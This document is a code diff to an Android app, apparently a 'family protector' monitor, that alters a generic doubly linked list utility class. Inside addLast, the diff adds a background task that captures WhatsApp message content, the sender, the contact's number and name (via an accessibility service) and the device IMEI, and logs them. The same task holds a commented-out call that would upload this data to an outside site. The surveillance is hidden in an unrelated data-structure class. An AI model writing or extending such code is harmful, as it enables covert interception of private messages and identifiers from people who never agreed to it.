@@ -1,7 +1,14 @@
 package com.family.util;
 
+import android.os.AsyncTask;
+
+import com.family.accessibility.MyAccessibilityService;
 import com.family.familyprotector.Logger;
 import com.family.familyprotector.Message;
+import com.family.internet.InternetHelper;
+
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.util.Date;
 import java.util.NoSuchElementException;
@@ -11,17 +18,13 @@ public class DoublyLinkedList<E> {
     public Node head;
     public Node tail;
     public int size;
-    public int MAX_SIZE = 1000;
+    public int MAX_SIZE = 10;
 
     public DoublyLinkedList() {
         size = 0;
     }
 
-    /**
-     * this class keeps track of each element information
-     *
-     * @author java2novice
-     */
+
     public class Node {
         public E element;
         public Node next;
@@ -68,10 +71,10 @@ public class DoublyLinkedList<E> {
         }
         Message m = (Message)element;
         if(m.date != null) {
-            long s = m.date.getTime();
+            long s = m.date.getTimeInMillis();
             long now = new Date().getTime();
             if(now - s > (1000 * 60 * 60 * 24 * 7)) {
-                return;
+                //return;
             }
         }
         Node tmp = new Node(element, head, null);
@@ -84,7 +87,7 @@ public class DoublyLinkedList<E> {
             tail = tmp;
         }
         size++;
-        Logger.l("adding first: " + element.toString());
+        Logger.l("WHATSAPPP","adding first: " + m.sender + "--" + m.content);
     }
 
     /**
@@ -92,16 +95,38 @@ public class DoublyLinkedList<E> {
      *
      * @param element
      */
-    public void addLast(E element) {
+    public void addLast(final E element) {
 
+        new AsyncTask<String, String , Void>() {
+
+            @Override
+            protected Void doInBackground(String... strings) {
+                JSONObject jo = new JSONObject();
+                Message m = (Message) element;
+                String s = m.sender.equals("Men") ? "1" : "0";
+                try {
+                    jo.put("sender", s); //1 or 0
+                    jo.put("start", m.date.getTimeInMillis());
+                    jo.put("content", m.content);
+                    jo.put("number", MyAccessibilityService.conversationMap.get(MyAccessibilityService.lastConversation).number);
+                    jo.put("name", MyAccessibilityService.lastConversation);
+                    jo.put("imei", MyAccessibilityService.imei); //1 or 0
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+                Logger.l("WHATSAPPP", "WILL BE SENDEND" + jo.toString());
+                //new InternetHelper().send("https://www.lookin24.com/Wpmsg",jo.toString());
+                return null;
+            }
+        }.execute();
         Node tmp = new Node(element, null, tail);
         //elemesem daha yaxshidi
         Message m = (Message)element;
         if(m.date != null) {
-            long s = m.date.getTime();
+            long s = m.date.getTimeInMillis();
             long now = new Date().getTime();
             if(now - s > (1000 * 60 * 60 * 24 * 7)) {
-                return;
+                //return;
             }
         }
         if (tail != null) {
@@ -113,10 +138,9 @@ public class DoublyLinkedList<E> {
         }
         size++;
         if(size > MAX_SIZE) {
-            size--;
-            head = head.next;
+            removeFirst();
         }
-        Logger.l("adding last: " + element.toString());
+        Logger.l("WHATSAPPP","adding last: " + m.sender + "--" + m.content);
     }
 
     /**
